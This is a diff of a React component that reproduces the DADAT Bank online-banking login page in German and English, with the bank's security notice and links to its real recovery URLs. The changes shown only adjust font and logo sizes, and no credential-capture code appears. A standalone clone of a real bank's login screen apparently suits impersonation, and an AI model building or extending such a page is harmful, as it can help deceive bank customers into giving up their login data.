@@ -15,7 +15,7 @@ const Dadatbank = () => {
       {/* Header */}
       <header style={{ backgroundColor: "#fff" }}>
         <div className="max-w-[1200px] mx-auto flex items-center px-4 py-2">
-          <img src={dadatbankLogo} alt="DADAT BANK" className="h-4 md:h-7 object-contain" />
+          <img src={dadatbankLogo} alt="DADAT BANK" className="h-8 md:h-14 object-contain" />
         </div>
       </header>
 
@@ -41,7 +41,7 @@ const Dadatbank = () => {
           {/* Card body */}
           <div className="bg-white px-6 py-5 space-y-4">
             {/* Info text */}
-            <p className="text-sm leading-snug" style={{ color: "#333" }}>
+            <p className="text-xs md:text-sm leading-snug" style={{ color: "#333" }}>
               {lang === "de" ? (
                 <>
                   Hier können Sie sich für Ihr neues Online Banking anmelden. Beim Login wird eine sichere Verbindung aufgebaut. Bitte achten Sie darauf, dass Sie Ihre Zugangsdaten auf keiner anderen Seite eingeben und diese geheim halten. Wir werden Sie nie nach Ihrer PIN oder einer TAN fragen!
@@ -141,7 +141,7 @@ const Dadatbank = () => {
                 href="https://konto.dad.at/banking/usernameRecovery.xhtml"
                 target="_blank"
                 rel="noopener noreferrer"
-                className="text-[15px] no-underline hover:underline leading-tight py-0 my-0"
+                className="text-xs md:text-[15px] no-underline hover:underline leading-tight py-0 my-0"
                 style={{ color: "#b631a5" }}
               >
                 {lang === "de" ? "Benutzername vergessen?" : "Forgot username?"}
@@ -150,7 +150,7 @@ const Dadatbank = () => {
                 href="https://konto.dad.at/banking/passwordRecovery.xhtml"
                 target="_blank"
                 rel="noopener noreferrer"
-                className="text-[15px] no-underline hover:underline leading-tight py-0 my-0"
+                className="text-xs md:text-[15px] no-underline hover:underline leading-tight py-0 my-0"
                 style={{ color: "#b631a5" }}
               >
                 {lang === "de" ? "Passwort vergessen (nach Umstellung)?" : "Forgot password (after conversion)?"}
@@ -159,7 +159,7 @@ const Dadatbank = () => {
                 href="https://www.dad.at/Service/Service/Zugangsdaten"
                 target="_blank"
                 rel="noopener noreferrer"
-                className="text-[15px] no-underline hover:underline leading-tight py-0 my-0"
+                className="text-xs md:text-[15px] no-underline hover:underline leading-tight py-0 my-0"
                 style={{ color: "#b631a5" }}
               >
                 {lang === "de" ? "Zugangsdaten vergessen oder gesperrt" : "Access data forgotten or locked"}
@@ -168,14 +168,14 @@ const Dadatbank = () => {
                 href="https://konto.dad.at/"
                 target="_blank"
                 rel="noopener noreferrer"
-                className="text-[15px] no-underline hover:underline leading-tight py-0 my-0"
+                className="text-xs md:text-[15px] no-underline hover:underline leading-tight py-0 my-0"
                 style={{ color: "#b631a5" }}
               >
                 {lang === "de" ? "Login mit Ersatz Passwort" : "Login with replacement password"}
               </a>
               <a
                 href="#"
-                className="text-[15px] no-underline hover:underline leading-tight py-0 my-0"
+                className="text-xs md:text-[15px] no-underline hover:underline leading-tight py-0 my-0"
                 style={{ color: "#b631a5" }}
               >
                 {lang === "de" ? "Demoversion" : "Demo version"}
@@ -202,7 +202,7 @@ const Dadatbank = () => {
                 href="https://konto.dad.at/banking/login.xhtml#"
                 target="_blank"
                 rel="noopener noreferrer"
-                className="text-[15px] no-underline hover:underline leading-tight py-0 my-0"
+                className="text-xs md:text-[15px] no-underline hover:underline leading-tight py-0 my-0"
                 style={{ color: "#b631a5" }}
               >
                 {lang === "de" ? "Benutzername vergessen" : "Forgot username"}
@@ -211,7 +211,7 @@ const Dadatbank = () => {
                 href="https://konto.dad.at/banking/login.xhtml#"
                 target="_blank"
                 rel="noopener noreferrer"
-                className="text-[15px] no-underline hover:underline leading-tight py-0 my-0"
+                className="text-xs md:text-[15px] no-underline hover:underline leading-tight py-0 my-0"
                 style={{ color: "#b631a5" }}
               >
                 {lang === "de" ? "Passwort vergessen" : "Forgot password"}
